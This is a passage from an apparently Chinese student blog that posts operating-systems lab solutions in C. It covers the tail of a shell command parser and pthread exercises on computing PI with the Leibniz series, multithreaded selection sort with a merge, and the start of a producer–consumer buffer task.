class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      ret = <span class="string">'a'</span>;</span><br><span class="line">      <span class="keyword">while</span> (s &lt; es &amp;&amp; !<span class="built_in">strchr</span>(whitespace, *s) &amp;&amp; !<span class="built_in">strchr</span>(symbols, *s)) s++;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (eq) *eq = s;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (s &lt; es &amp;&amp; <span class="built_in">strchr</span>(whitespace, *s)) s++;</span><br><span class="line">  *ps = s;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peek</span><span class="params">(<span class="keyword">char</span> **ps, <span class="keyword">char</span> *es, <span class="keyword">char</span> *toks)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s;</span><br><span class="line"></span><br><span class="line">  s = *ps;</span><br><span class="line">  <span class="keyword">while</span> (s &lt; es &amp;&amp; <span class="built_in">strchr</span>(whitespace, *s)) s++;</span><br><span class="line">  *ps = s;</span><br><span class="line">  <span class="keyword">return</span> *s &amp;&amp; <span class="built_in">strchr</span>(toks, *s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">parseline</span><span class="params">(<span class="keyword">char</span> **, <span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function">struct cmd *<span class="title">parsepipe</span><span class="params">(<span class="keyword">char</span> **, <span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function">struct cmd *<span class="title">parseexec</span><span class="params">(<span class="keyword">char</span> **, <span class="keyword">char</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// make a copy of the characters in the input buffer, starting from s through</span></span><br><span class="line"><span class="comment">// es. null-terminate the copy to make it a string.</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">mkcopy</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">char</span> *es)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n = es - s;</span><br><span class="line">  <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(n + <span class="number">1</span>);</span><br><span class="line">  assert(c);</span><br><span class="line">  <span class="built_in">strncpy</span>(c, s, n);</span><br><span class="line">  c[n] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 解析命令 */</span></span><br><span class="line"><span class="function">struct cmd *<span class="title">parsecmd</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *es;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> *<span class="title">cmd</span>;</span></span><br><span class="line"></span><br><span class="line">  es = s + <span class="built_in">strlen</span>(s);</span><br><span class="line">  cmd = parseline(&amp;s, es);</span><br><span class="line">  <span class="built_in">peek</span>(&amp;s, es, <span class="string">""</span>);</span><br><span class="line">  <span class="keyword">if</span> (s != es) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"leftovers: %s\n"</span>, s);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">parseline</span><span class="params">(<span class="keyword">char</span> **ps, <span class="keyword">char</span> *es)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> *<span class="title">cmd</span>;</span></span><br><span class="line">  cmd = parsepipe(ps, es);</span><br><span class="line">  <span class="keyword">return</span> cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">parsepipe</span><span class="params">(<span class="keyword">char</span> **ps, <span class="keyword">char</span> *es)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> *<span class="title">cmd</span>;</span></span><br><span class="line"></span><br><span class="line">  cmd = parseexec(ps, es);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">peek</span>(ps, es, <span class="string">"|"</span>)) &#123;</span><br><span class="line">    gettoken(ps, es, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    cmd = pipecmd(cmd, parsepipe(ps, es));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">parseredirs</span><span class="params">(struct cmd *cmd, <span class="keyword">char</span> **ps, <span class="keyword">char</span> *es)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> tok;</span><br><span class="line">  <span class="keyword">char</span> *q, *eq;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">peek</span>(ps, es, <span class="string">"&lt;&gt;"</span>)) &#123;</span><br><span class="line">    tok = gettoken(ps, es, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (gettoken(ps, es, &amp;q, &amp;eq) != <span class="string">'a'</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"missing file for redirection\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (tok) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">        cmd = redircmd(cmd, mkcopy(q, eq), <span class="string">'&lt;'</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">        cmd = redircmd(cmd, mkcopy(q, eq), <span class="string">'&gt;'</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct cmd *<span class="title">parseexec</span><span class="params">(<span class="keyword">char</span> **ps, <span class="keyword">char</span> *es)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *q, *eq;</span><br><span class="line">  <span class="keyword">int</span> tok, argc;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">execcmd</span> *<span class="title">cmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cmd</span> *<span class="title">ret</span>;</span></span><br><span class="line"></span><br><span class="line">  ret = execcmd();</span><br><span class="line">  cmd = (struct execcmd *)ret;</span><br><span class="line"></span><br><span class="line">  argc = <span class="number">0</span>;</span><br><span class="line">  ret = parseredirs(ret, ps, es);</span><br><span class="line">  <span class="keyword">while</span> (!<span class="built_in">peek</span>(ps, es, <span class="string">"|"</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((tok = gettoken(ps, es, &amp;q, &amp;eq)) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (tok != <span class="string">'a'</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"syntax error\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cmd-&gt;argv[argc] = mkcopy(q, eq);</span><br><span class="line">    argc++;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= MAXARGS) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"too many args\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = parseredirs(ret, ps, es);</span><br><span class="line">  &#125;</span><br><span class="line">  cmd-&gt;argv[argc] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="task-7-多线程题目"><a class="markdownIt-Anchor" href="#task-7-多线程题目"></a> Task 7+ 多线程题目</h1><h2 id="71-pi1c-task7"><a class="markdownIt-Anchor" href="#71-pi1c-task7"></a> 7.1 pi1.c (Task7)</h2><p>使用2个线程根据莱布尼兹级数计算PI：</p><ul><li>莱布尼兹级数公式: 1 - 1/3 + 1/5 - 1/7 + 1/9 - … = PI/4</li><li>主线程创建1个辅助线程</li><li>主线程计算级数的前半部分</li><li>辅助线程计算级数的后半部分</li><li>主线程等待辅助线程运行結束后,将前半部分和后半部分相加</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER 0x7ffffff  <span class="comment">//此值越大，PI越精确</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> worker_output;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">worker</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; NUMBER / <span class="number">2</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span>) &#123;</span><br><span class="line">      worker_output += <span class="number">1.0</span> / (<span class="number">2</span> * i - <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      worker_output -= <span class="number">1.0</span> / (<span class="number">2</span> * i - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> master_output;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">master</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = NUMBER / <span class="number">2</span> + <span class="number">1</span>; i &lt;= NUMBER; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span>) &#123;</span><br><span class="line">      master_output += <span class="number">1.0</span> / (<span class="number">2</span> * i - <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      master_output -= <span class="number">1.0</span> / (<span class="number">2</span> * i - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> worker_tid;</span><br><span class="line">  <span class="keyword">double</span> total, PI;</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;worker_tid, <span class="literal">NULL</span>, worker, <span class="literal">NULL</span>);</span><br><span class="line">  master();</span><br><span class="line">  pthread_join(worker_tid, <span class="literal">NULL</span>);</span><br><span class="line">  total = master_output + worker_output;</span><br><span class="line">  PI = total * <span class="number">4</span>;</span><br><span class="line">  <span class="comment">// printf("master_output = %lf, worker_output = %lf, total = %lf\n",</span></span><br><span class="line">  <span class="comment">// master_output, worker_output, total);</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"PI: %lf\n"</span>, PI);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="72-pi2c-task7"><a class="markdownIt-Anchor" href="#72-pi2c-task7"></a> 7.2  pi2.c (Task7)</h2><p>使用N个线程根据莱布尼兹级数计算PI：</p><ul><li>与上一题类似，但本题更加通用化，能适应N个核心</li><li>主线程创建N个辅助线程</li><li>每个辅助线程计算一部分任务，并将结果返回</li><li>主线程等待N个辅助线程运行结束，将所有辅助线程的结果累加</li><li>本题要求 1: 使用线程参数，消除程序中的代码重复</li><li>本题要求 2: 不能使用全局变量存储线程返回值</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// int array[] = &#123;1, 1, 1, 2, 2, 2&#125;;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_TOTAL 0x7ffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_CPU 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_CHILD (NR_TOTAL / NR_CPU)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line"><span class="comment">//   int *array;</span></span><br><span class="line">  <span class="keyword">int</span> start;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">end</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">result</span> &#123;</span></span><br><span class="line">  <span class="keyword">double</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">compute</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">param</span> *<span class="title">param</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">result</span> *<span class="title">result</span>;</span></span><br><span class="line">  <span class="keyword">float</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  param = (struct param *)arg;</span><br><span class="line">  <span class="keyword">for</span> (i = param-&gt;start; i &lt; param-&gt;<span class="built_in">end</span>; i++)</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span>)</span><br><span class="line">      sum -= <span class="number">1.0</span> / (i * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sum += <span class="number">1.0</span> / (i * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct result));</span><br><span class="line">  result-&gt;sum = sum;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> workers[NR_CPU];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">params</span>[<span class="title">NR_CPU</span>];</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CPU; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> *<span class="title">param</span>;</span></span><br><span class="line">    param = &amp;params[i];</span><br><span class="line">    <span class="comment">// param-&gt;array = array;</span></span><br><span class="line">    param-&gt;start = i * NR_CHILD;</span><br><span class="line">    param-&gt;<span class="built_in">end</span> = (i + <span class="number">1</span>) * NR_CHILD;</span><br><span class="line">    pthread_create(&amp;workers[i], <span class="literal">NULL</span>, compute, param);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CPU; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">result</span> *<span class="title">result</span>;</span></span><br><span class="line">    pthread_join(workers[i], (<span class="keyword">void</span> **)&amp;result);</span><br><span class="line">    sum += result-&gt;sum;</span><br><span class="line">    <span class="built_in">free</span>(result);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">double</span> PI = sum * <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"PI: %lf\n"</span>, PI);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="73-sortctask-8"><a class="markdownIt-Anchor" href="#73-sortctask-8"></a> 7.3 sort.c(Task 8)</h2><p>多线程排序</p><ul><li>主线程创建两个辅助线程</li><li>辅助线程1使用选择排序算法对数组的前半部分排序</li><li>辅助线程2使用选择排序算法对数组的后半部分排序</li><li>主线程等待辅助线程运行結束后,使用归并排序算法归并子线程的计算结果</li><li>本题要求 1: 使用线程参数，消除程序中的代码重复</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[] = &#123;<span class="number">2</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> sorted_array[] = &#123;<span class="number">2</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_TOTAL 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_CPU 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_CHILD (NR_TOTAL / NR_CPU)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> *<span class="built_in">array</span>;</span><br><span class="line">  <span class="keyword">int</span> start;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">end</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">result</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">compute</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">param</span> *<span class="title">param</span>;</span></span><br><span class="line">  param = (struct param *)arg;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = param-&gt;start; i &lt; param-&gt;<span class="built_in">end</span> - <span class="number">1</span>; i++) &#123;  <span class="comment">//选择排序</span></span><br><span class="line">    <span class="keyword">int</span> k = i;                                           <span class="comment">//最小值索引</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; param-&gt;<span class="built_in">end</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (param-&gt;<span class="built_in">array</span>[j] &lt; param-&gt;<span class="built_in">array</span>[k]) &#123;</span><br><span class="line">        k = j;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (k != i) &#123;  <span class="comment">//交换</span></span><br><span class="line">      <span class="keyword">int</span> temp;</span><br><span class="line">      temp = <span class="built_in">array</span>[i];</span><br><span class="line">      <span class="built_in">array</span>[i] = <span class="built_in">array</span>[k];</span><br><span class="line">      <span class="built_in">array</span>[k] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> workers[NR_CPU];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">params</span>[<span class="title">NR_CPU</span>];</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CPU; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> *<span class="title">param</span>;</span></span><br><span class="line">    param = &amp;params[i];</span><br><span class="line">    param-&gt;<span class="built_in">array</span> = <span class="built_in">array</span>;</span><br><span class="line">    param-&gt;start = i * NR_CHILD;</span><br><span class="line">    param-&gt;<span class="built_in">end</span> = (i + <span class="number">1</span>) * NR_CHILD;</span><br><span class="line">    pthread_create(&amp;workers[i], <span class="literal">NULL</span>, compute, param);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CPU; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">result</span> *<span class="title">result</span>;</span></span><br><span class="line">    pthread_join(workers[i], (<span class="keyword">void</span> **)&amp;result);</span><br><span class="line">    <span class="comment">// sum += result-&gt;sum;</span></span><br><span class="line">    <span class="comment">// free(result);</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//归并排序</span></span><br><span class="line">  <span class="keyword">int</span> p1 = <span class="number">0</span>, p2 = NR_CHILD, p3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> cur;</span><br><span class="line">  <span class="keyword">while</span> (p1 &lt; NR_CHILD || p2 &lt; NR_TOTAL) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p1 == NR_CHILD) &#123;</span><br><span class="line">      cur = <span class="built_in">array</span>[p2++];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 == NR_TOTAL) &#123;</span><br><span class="line">      cur = <span class="built_in">array</span>[p1++];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">array</span>[p1] &lt; <span class="built_in">array</span>[p2]) &#123;</span><br><span class="line">      cur = <span class="built_in">array</span>[p1++];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      cur = <span class="built_in">array</span>[p2++];</span><br><span class="line">    &#125;</span><br><span class="line">    sorted_array[p3++] = cur;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//输出结果</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NR_TOTAL; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, sorted_array[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="74-pc1ctask-9"><a class="markdownIt-Anchor" href="#74-pc1ctask-9"></a> 7.4 pc1.c(Task 9)</h2><ul><li>系统中有3个线程：生产者、计算者、消费者</li><li>系统中有2个容量为4的缓冲区：buffer1、buffer2</li><li>生产者生产’a’、‘b’、‘c’、‘d’、‘e’、‘f’、‘g’、'h’八个字符，放入到buffer1</li><li>计算者从buffer1取出字符，将小写字符转换为大写字符，放入到buffer2</li><li>消费者从buffer2取出字符，将其打印到屏幕上</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 